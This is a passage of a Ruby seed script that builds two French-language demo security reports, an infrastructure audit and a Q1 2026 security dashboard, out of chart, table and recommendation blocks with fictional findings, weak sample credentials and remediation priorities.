          id: "bi_010a", type: "findings-summary", children: [],
          data: { title: "Vulnérabilités Nessus", critical: 8, high: 14, medium: 23, low: 31, info: 47, showPercentage: true }
        },
        {
          id: "bi_010b", type: "stacked-bar", children: [],
          data: {
            title: "Vulnérabilités par serveur",
            labels: ["DC01", "DC02", "SQL01", "WEB01", "WEB02", "MON01", "BACKUP", "JUMP"],
            series: [
              { name: "Critique", color: "#e74c3c", values: [1, 1, 3, 1, 1, 0, 1, 0] },
              { name: "Élevé", color: "#e67e22", values: [2, 2, 3, 2, 2, 1, 1, 1] },
              { name: "Moyen", color: "#f39c12", values: [3, 2, 4, 3, 4, 2, 3, 2] }
            ],
            orientation: "vertical"
          }
        }
      ],
      data: {}
    },

    # ── Firewall rules (table) ──
    {
      id: "bi_011", type: "section-title", children: [],
      data: { text: "4. Analyse des flux réseau", level: 2 }
    },
    {
      id: "bi_012", type: "table", children: [],
      data: {
        headers: ["#", "Source", "Destination", "Port", "Proto", "Action", "Remarque"],
        rows: [
          ["1", "ANY", "10.10.3.10", "443", "TCP", "ALLOW", "OK — HTTPS frontend"],
          ["2", "ANY", "10.10.3.11", "443", "TCP", "ALLOW", "OK — API backend"],
          ["3", "10.10.0.0/16", "10.10.2.20", "5432", "TCP", "ALLOW", "⚠ Trop large — restreindre aux web servers"],
          ["4", "ANY", "10.10.1.5", "22", "TCP", "ALLOW", "⚠ SSH bastion exposé à Internet"],
          ["5", "0.0.0.0/0", "0.0.0.0/0", "ANY", "ANY", "ALLOW", "🔴 Rule trop permissive en sortie"]
        ]
      }
    },
    {
      id: "bi_013", type: "callout", children: [],
      data: { variant: "danger", content: "La règle #5 autorise tout trafic sortant sans restriction. Cela facilite l'exfiltration de données et le C2 (Command & Control)." }
    },

    # ── Network flow ──
    {
      id: "bi_014", type: "sankey-diagram", children: [],
      data: {
        title: "Flux réseau principaux",
        nodes: [
          { label: "Internet", color: "#e74c3c" },
          { label: "DMZ", color: "#e67e22" },
          { label: "VLAN Web", color: "#5B8FD4" },
          { label: "VLAN Data", color: "#9b59b6" },
          { label: "VLAN Mgmt", color: "#27ae60" },
          { label: "Backup", color: "#1abc9c" }
        ],
        links: [
          { source: 0, target: 1, value: 100 },
          { source: 1, target: 2, value: 80 },
          { source: 2, target: 3, value: 60 },
          { source: 3, target: 5, value: 30 },
          { source: 4, target: 2, value: 20 },
          { source: 4, target: 3, value: 25 },
          { source: 4, target: 5, value: 15 }
        ]
      }
    },

    # ── Credentials found ──
    {
      id: "bi_015", type: "section-title", children: [],
      data: { text: "5. Credentials exposés", level: 2 }
    },
    {
      id: "bi_016", type: "credentials-table", children: [],
      data: {
        title: "Credentials récupérés",
        showPasswords: false,
        credentials: [
          { username: "sa", password: "Passw0rd!", source: "PostgreSQL config", severity: "critical", type: "database", found: "Fichier .env non protégé", location: "SRV-SQL01" },
          { username: "admin", password: "admin123", source: "Grafana default", severity: "high", type: "application", found: "Credentials par défaut", location: "SRV-MON01" },
          { username: "backup_svc", password: "B@ckup2024", source: "Script bash", severity: "high", type: "service", found: "Script /opt/backup.sh", location: "SRV-BACKUP" },
          { username: "deployer", password: "d3pl0y!", source: "GitLab CI variable", severity: "medium", type: "ci-cd", found: "Variable CI non masquée", location: "GitLab" }
        ]
      }
    },

    # ── Heatmap pentest ──
    {
      id: "bi_017", type: "heatmap", children: [],
      data: {
        title: "Activité suspecte par VLAN (derniers 7 jours)",
        xLabels: ["Lun", "Mar", "Mer", "Jeu", "Ven", "Sam", "Dim"],
        yLabels: ["DMZ", "VLAN Web", "VLAN Data", "VLAN Mgmt", "Backup"],
        data: [
          [5, 8, 12, 6, 4, 1, 0],
          [3, 4, 7, 3, 5, 0, 0],
          [1, 2, 15, 8, 3, 0, 0],
          [0, 1, 2, 1, 0, 0, 0],
          [0, 0, 1, 0, 12, 0, 0]
        ],
        minColor: "#f0ede6",
        maxColor: "#e74c3c"
      }
    },

    # ── Recommendations ──
    {
      id: "bi_018", type: "section-title", children: [],
      data: { text: "6. Recommandations prioritaires", level: 2 }
    },
    {
      id: "bi_019", type: "recommendation", children: [],
      data: {
        title: "Microsegmentation des VLANs — Restreindre accès PostgreSQL",
        priority: "P1",
        effort: "Faible",
        impact: "Critique",
        description: "Restreindre la règle firewall #3 pour n'autoriser que SRV-WEB01 et SRV-WEB02 vers SRV-SQL01:5432.",
        businessValue: "Réduit la surface d'attaque de la base de données contenant toutes les données métier.",
        tools: ["FortiManager", "Ansible"],
        timeline: "1 jour",
        owner: "Équipe Réseau"
      }
    },
    {
      id: "bi_020", type: "recommendation", children: [],
      data: {
        title: "Rotation des credentials et mise en coffre-fort",
        priority: "P1",
        effort: "Moyen",
        impact: "Élevé",
        description: "Migrer tous les credentials détectés vers HashiCorp Vault. Supprimer les mots de passe en clair des fichiers de config et scripts.",
        businessValue: "Élimine le risque de compromission en chaîne via les credentials en clair.",
        tools: ["HashiCorp Vault", "Ansible Vault"],
        timeline: "1 semaine",
        owner: "DevSecOps"
      }
    },
    {
      id: "bi_021", type: "waterfall-chart", children: [],
      data: {
        title: "Impact des remédiations sur le score de risque",
        items: [
          { label: "Score initial", value: 85, type: "total" },
          { label: "Fix PostgreSQL", value: -20, type: "decrease" },
          { label: "Fix credentials", value: -15, type: "decrease" },
          { label: "Fix firewall #5", value: -18, type: "decrease" },
          { label: "SSH hardening", value: -8, type: "decrease" },
          { label: "Score cible", value: 24, type: "total" }
        ]
      }
    }
  ]
}

Report.where(title: "Audit Infra — DataForge").destroy_all
Report.create!(
  title: "Audit Infra — DataForge",
  report_type: :infra,
  content: infra_content,
  accent_color: "#5B8FD4"
)
puts "✓ Infrastructure audit report created"

# ─── Security Dashboard Report (Graph-heavy) ──────────────────────────
dashboard_content = {
  blocks: [
    {
      id: "bd_001", type: "section-title", children: [],
      data: { text: "Tableau de Bord Sécurité — Q1 2026", level: 1 }
    },
    {
      id: "bd_002", type: "text", children: [],
      data: { content: "Dashboard trimestriel de la posture sécurité de <code class=\"arbor-cartouche\">NexaCorp</code>. Ce rapport consolide les indicateurs clés issus des outils <code class=\"arbor-cartouche\">Qualys</code>, <code class=\"arbor-cartouche\">Splunk</code>, <code class=\"arbor-cartouche\">CrowdStrike</code> et du programme de bug bounty." }
    },

    # ── KPIs row ──
    {
      id: "bd_003", type: "horizontal-div", children: [
        {
          id: "bd_003a", type: "gauge-chart", children: [],
          data: { title: "Score Sécurité Global", value: 72, max: 100, unit: "%" }
        },
        {
          id: "bd_003b", type: "gauge-chart", children: [],
          data: { title: "Taux de Patch", value: 87, max: 100, unit: "%" }
        },
        {
          id: "bd_003c", type: "gauge-chart", children: [],
          data: { title: "Couverture EDR", value: 94, max: 100, unit: "%" }
        }
      ],
      data: {}
    },
    {
      id: "bd_004", type: "separator", children: [], data: { style: "line" }
    },

    # ── Vulnerabilities trend ──
    {
      id: "bd_005", type: "section-title", children: [],
      data: { text: "1. Évolution des vulnérabilités", level: 2 }
    },
    {
      id: "bd_006", type: "line-chart", children: [],
      data: {
        title: "Vulnérabilités ouvertes par mois",
        labels: ["Oct", "Nov", "Déc", "Jan", "Fév", "Mar"],
        datasets: [
          { name: "Critiques", color: "#e74c3c", values: [12, 8, 15, 10, 7, 5] },
          { name: "Élevées", color: "#e67e22", values: [28, 22, 35, 25, 18, 14] },
          { name: "Moyennes", color: "#f39c12", values: [45, 38, 52, 40, 35, 30] }
        ],
        showDots: true,
        showArea: false
      }
    },
    {
      id: "bd_007", type: "horizontal-div", children: [
        {
          id: "bd_007a", type: "stacked-bar", children: [],
          data: {
            title: "Nouvelles vs Résolues par mois",
            labels: ["Oct", "Nov", "Déc", "Jan", "Fév", "Mar"],
            series: [
              { name: "Nouvelles", color: "#e74c3c", values: [18, 25, 32, 15, 12, 8] },
              { name: "Résolues", color: "#27ae60", values: [22, 20, 28, 30, 25, 22] }
            ],
            orientation: "vertical"
          }
        },
        {
          id: "bd_007b", type: "area-chart", children: [],
          data: {
            title: "MTTR (Mean Time To Remediate)",
            labels: ["Oct", "Nov", "Déc", "Jan", "Fév", "Mar"],
            datasets: [
              { name: "Critiques (jours)", color: "#e74c3c", values: [5.2, 4.8, 6.1, 3.5, 2.8, 2.1] },
              { name: "Élevées (jours)", color: "#e67e22", values: [12, 10, 15, 9, 7, 5.5] }
            ],
            showDots: true
          }
        }
      ],
      data: {}
    },

    # ── Attack surface ──
    {
      id: "bd_008", type: "section-title", children: [],
      data: { text: "2. Surface d'attaque", level: 2 }
    },
    {
      id: "bd_009", type: "horizontal-div", children: [
        {
          id: "bd_009a", type: "treemap", children: [],
          data: {
            title: "Surface exposée par actif",
            items: [
              { label: "Applications Web", value: 45, color: "#e74c3c" },
              { label: "APIs REST", value: 32, color: "#e67e22" },
              { label: "Infra Cloud AWS", value: 28, color: "#5B8FD4" },
              { label: "VPN Sites", value: 15, color: "#9b59b6" },
              { label: "IoT/OT", value: 12, color: "#1abc9c" },
              { label: "Mobile Apps", value: 8, color: "#E8A855" }
            ]
          }
        },
        {
          id: "bd_009b", type: "pie-chart", children: [],
          data: {
            title: "Répartition par criticité",
            items: [
              { label: "Critique", value: 5, color: "#e74c3c" },
              { label: "Élevé", value: 14, color: "#e67e22" },
              { label: "Moyen", value: 30, color: "#f39c12" },
              { label: "Faible", value: 35, color: "#27ae60" },
              { label: "Info", value: 47, color: "#5B8FD4" }
            ],
            donut: true
          }
        }
      ],
      data: {}
    },

    # ── Security Maturity ──
    {
      id: "bd_010", type: "section-title", children: [],
      data: { text: "3. Maturité sécurité", level: 2 }
    },
    {
      id: "bd_011", type: "horizontal-div", children: [
        {
          id: "bd_011a", type: "radar-chart", children: [],
          data: {
            title: "Maturité par domaine",
            axes: [
              { label: "Gouvernance", value: 7, max: 10 },
              { label: "Protection", value: 6, max: 10 },
              { label: "Détection", value: 8, max: 10 },
              { label: "Réponse", value: 5, max: 10 },
              { label: "Récupération", value: 4, max: 10 },
              { label: "Compliance", value: 7, max: 10 }
            ],
            color: "#E8A855"
          }
        },
        {
          id: "bd_011b", type: "bar-chart", children: [],
          data: {
            title: "Score par framework",
            orientation: "horizontal",
            showValues: true,
            items: [
              { label: "NIST CSF", value: 68, color: "#5B8FD4" },
              { label: "ISO 27001", value: 72, color: "#27ae60" },
              { label: "CIS Controls", value: 61, color: "#E8A855" },
              { label: "OWASP ASVS", value: 55, color: "#e67e22" }
            ]
          }
        }
      ],
      data: {}
    },

    # ── Incidents ──
    {
      id: "bd_012", type: "section-title", children: [],
      data: { text: "4. Incidents de sécurité", level: 2 }
    },
    {
      id: "bd_013", type: "heatmap", children: [],
      data: {
        title: "Alertes SOC par jour et par heure (Mars 2026)",
        xLabels: ["00h", "04h", "08h", "12h", "16h", "20h"],
        yLabels: ["Lun", "Mar", "Mer", "Jeu", "Ven", "Sam", "Dim"],
        data: [
          [2, 1, 12, 18, 15, 5],
          [1, 0, 14, 22, 16, 8],
          [3, 2, 11, 15, 19, 4],
          [0, 1, 16, 25, 14, 6],
          [1, 0, 13, 20, 17, 3],
          [5, 3, 2, 1, 1, 8],
          [7, 4, 1, 0, 0, 6]
        ],
        minColor: "#f0ede6",
        maxColor: "#e74c3c"
      }
    },
    {
      id: "bd_014", type: "funnel-chart", children: [],
      data: {
        title: "Pipeline de triage des alertes",
        items: [
          { label: "Alertes brutes", value: 12480, color: "#95A5A6" },
          { label: "Après dédup", value: 3200, color: "#5B8FD4" },
          { label: "Enrichies", value: 1800, color: "#E8A855" },
          { label: "Vrais positifs", value: 420, color: "#e67e22" },
          { label: "Incidents", value: 38, color: "#e74c3c" }
        ]
      }
    },
    {
      id: "bd_015", type: "table", children: [],
      data: {
        headers: ["Date", "Incident", "Sévérité", "MTTR", "Statut"],
        rows: [
          ["2026-03-22", "Brute force SSH bastion", "Élevé", "2h", "Résolu"],
          ["2026-03-18", "Exfiltration tentée via DNS", "Critique", "45min", "Résolu"],
          ["2026-03-15", "Phishing ciblé — CFO", "Élevé", "4h", "Résolu"],
          ["2026-03-08", "Ransomware bloqué par EDR", "Critique", "15min", "Résolu"],
          ["2026-03-02", "Scan massif depuis Tor", "Moyen", "—", "Bloqué auto"]
        ]
      }
    },

    # ── Compliance sparklines ──
    {
      id: "bd_016", type: "section-title", children: [],
      data: { text: "5. Tendances compliance", level: 2 }
    },
    {
      id: "bd_017", type: "horizontal-div", children: [
        {
          id: "bd_017a", type: "sparkline", children: [],
          data: { title: "Score ISO 27001", values: [58, 62, 65, 68, 70, 72], color: "#27ae60" }
        },
        {
          id: "bd_017b", type: "sparkline", children: [],
          data: { title: "Score NIST CSF", values: [52, 55, 58, 62, 65, 68], color: "#5B8FD4" }
        },
        {
          id: "bd_017c", type: "sparkline", children: [],
          data: { title: "Taux de patch", values: [78, 82, 80, 85, 84, 87], color: "#E8A855" }
        }
      ],
      data: {}
    },
    {
      id: "bd_018", type: "scatter-plot", children: [],
      data: {
        title: "Risque vs Effort de remédiation",
        xLabel: "Effort (jours-homme)",
        yLabel: "Réduction de risque",
        points: [
          { x: 2, y: 85, label: "Fix SQLi", color: "#e74c3c" },
          { x: 5, y: 70, label: "Patch OS", color: "#e67e22" },
          { x: 1, y: 60, label: "MFA admin", color: "#27ae60" },
          { x: 15, y: 45, label: "SIEM tuning", color: "#5B8FD4" },
          { x: 8, y: 55, label: "WAF deploy", color: "#9b59b6" },
          { x: 3, y: 40, label: "Secrets rotation", color: "#E8A855" },
          { x: 20, y: 30, label: "Zero Trust", color: "#1abc9c" }
        ]
      }
    }
  ]
}

Report.where(title: "Dashboard Sécurité — Q1 2026").destroy_all
Report.create!(
  title: "Dashboard Sécurité — Q1 2026",
  report_type: :audit,
  content: dashboard_content,
  accent_color: "#E8A855"
)
puts "✓ Security dashboard report created"
